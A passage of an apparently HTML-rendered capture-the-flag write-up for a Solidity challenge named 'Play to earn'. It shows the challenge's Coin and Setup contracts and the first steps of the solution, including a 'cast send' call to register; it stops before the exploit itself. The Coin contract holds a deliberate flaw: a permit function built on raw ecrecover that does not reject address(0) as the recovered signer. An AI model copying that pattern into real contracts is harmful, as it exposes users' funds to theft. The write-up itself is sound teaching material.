+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">101
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/access/Ownable.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/utils/cryptography/EIP712.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Coin <span style="color:#e67e80">is</span> Ownable, EIP712 {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> <span style="color:#d699b6">name</span>     <span style="color:#7a8478">=</span> <span style="color:#b2c98f">&#34;COIN&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> symbol   <span style="color:#7a8478">=</span> <span style="color:#b2c98f">&#34;COIN&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span>  <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> decimals <span style="color:#7a8478">=</span> <span style="color:#d699b6">18</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes32</span> <span style="color:#e67e80">constant</span> PERMIT_TYPEHASH <span style="color:#7a8478">=</span> <span style="color:#d699b6">keccak256</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span>  Approval(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> src, <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> guy, <span style="color:#dbbc7f">uint</span> wad);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span>  Transfer(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> src, <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> dst, <span style="color:#dbbc7f">uint</span> wad);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span>  Deposit(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> dst, <span style="color:#dbbc7f">uint</span> wad);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span>  Withdrawal(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> src, <span style="color:#dbbc7f">uint</span> wad);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span>  PrivilegedWithdrawal(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> src, <span style="color:#dbbc7f">uint</span> wad);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span> (<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">uint</span>)                       <span style="color:#e67e80">public</span>  nonces;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span> (<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">uint</span>)                       <span style="color:#e67e80">public</span>  balanceOf;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span> (<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#e67e80">mapping</span> (<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">uint</span>))  <span style="color:#e67e80">public</span>  allowance;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>() Ownable(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>) EIP712(<span style="color:#d699b6">name</span>, <span style="color:#b2c98f">&#34;1&#34;</span>) {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fallback() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        deposit();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">deposit</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        balanceOf[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">+=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>;
+</span></span><span style="display:flex;"><span>        emit Deposit(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">withdraw</span>(<span style="color:#dbbc7f">uint</span> wad) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(balanceOf[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">&gt;=</span> wad);
+</span></span><span style="display:flex;"><span>        balanceOf[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">-=</span> wad;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(wad);
+</span></span><span style="display:flex;"><span>        emit Withdrawal(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, wad);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">privilegedWithdraw</span>() onlyOwner <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> wad <span style="color:#7a8478">=</span> balanceOf[<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>)];
+</span></span><span style="display:flex;"><span>        balanceOf[<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>)] <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(wad);
+</span></span><span style="display:flex;"><span>        emit PrivilegedWithdrawal(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, wad);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">totalSupply</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">approve</span>(<span style="color:#dbbc7f">address</span> guy, <span style="color:#dbbc7f">uint</span> wad) <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        allowance[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>][guy] <span style="color:#7a8478">=</span> wad;
+</span></span><span style="display:flex;"><span>        emit Approval(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, guy, wad);
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">permit</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> owner,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> spender,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> <span style="color:#d699b6">value</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> deadline,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> v,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> r,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> s
+</span></span><span style="display:flex;"><span>    ) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span> <span style="color:#7a8478">&lt;=</span> deadline, <span style="color:#b2c98f">&#34;signature expired&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> structHash <span style="color:#7a8478">=</span> <span style="color:#d699b6">keccak256</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encode</span>(PERMIT_TYPEHASH, owner, spender, <span style="color:#d699b6">value</span>, nonces[owner]<span style="color:#7a8478">++</span>, deadline)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> h <span style="color:#7a8478">=</span> _hashTypedDataV4(structHash);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> signer <span style="color:#7a8478">=</span> <span style="color:#d699b6">ecrecover</span>(h, v, r, s);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(signer <span style="color:#7a8478">==</span> owner, <span style="color:#b2c98f">&#34;invalid signer&#34;</span>);
+</span></span><span style="display:flex;"><span>        allowance[owner][spender] <span style="color:#7a8478">=</span> <span style="color:#d699b6">value</span>;
+</span></span><span style="display:flex;"><span>        emit Approval(owner, spender, <span style="color:#d699b6">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">transfer</span>(<span style="color:#dbbc7f">address</span> dst, <span style="color:#dbbc7f">uint</span> wad) <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, dst, wad);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">transferFrom</span>(<span style="color:#dbbc7f">address</span> src, <span style="color:#dbbc7f">address</span> dst, <span style="color:#dbbc7f">uint</span> wad)
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">public</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(balanceOf[src] <span style="color:#7a8478">&gt;=</span> wad);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (src <span style="color:#7a8478">!=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">&amp;&amp;</span> allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">!=</span> <span style="color:#d699b6">type</span>(uint256).<span style="color:#d699b6">max</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">&gt;=</span> wad);
+</span></span><span style="display:flex;"><span>            allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">-=</span> wad;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        balanceOf[src] <span style="color:#7a8478">-=</span> wad;
+</span></span><span style="display:flex;"><span>        balanceOf[dst] <span style="color:#7a8478">+=</span> wad;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit Transfer(src, dst, wad);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<details>
+  <summary style="color: #F99417; cursor: pointer">Setup.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { Coin } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./Coin.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { ArcadeMachine } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./ArcadeMachine.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Setup {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Coin <span style="color:#e67e80">public</span> coin;
+</span></span><span style="display:flex;"><span>    ArcadeMachine <span style="color:#e67e80">public</span> arcadeMachine;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> player;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>() <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        coin <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> Coin();
+</span></span><span style="display:flex;"><span>        arcadeMachine <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> ArcadeMachine(coin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// Assume that many people have played before you ;)
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>);
+</span></span><span style="display:flex;"><span>        coin.deposit{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>}();
+</span></span><span style="display:flex;"><span>        coin.approve(<span style="color:#dbbc7f">address</span>(arcadeMachine), <span style="color:#d699b6">19</span> <span style="color:#e67e80">ether</span>);
+</span></span><span style="display:flex;"><span>        arcadeMachine.play(<span style="color:#d699b6">19</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">register</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(player <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>        player <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>        coin.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">1337</span>);    <span style="color:#859289;font-style:italic">// free coins for new players :)
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> player <span style="color:#7a8478">!=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>) <span style="color:#7a8478">&amp;&amp;</span> player.<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">13</span>.<span style="color:#d699b6">37</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>I can register by interacting with setup contract : <code>cast send -r $RPC --private-key $PKEY $SETUP &quot;register()&quot;</code> which grant me 1337 coins.</p>
+<p>Using <code>withdraw()</code> from Coin contract I can convert those coins to ether.</p>
+<p>Also the challenge name <code>Play to earn</code> stand for the ability to play the arcade machine using the function <code>play(uint256)</code>. <code>uint256</code> is the type of the argument taken by the function <strong>play()</strong>.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
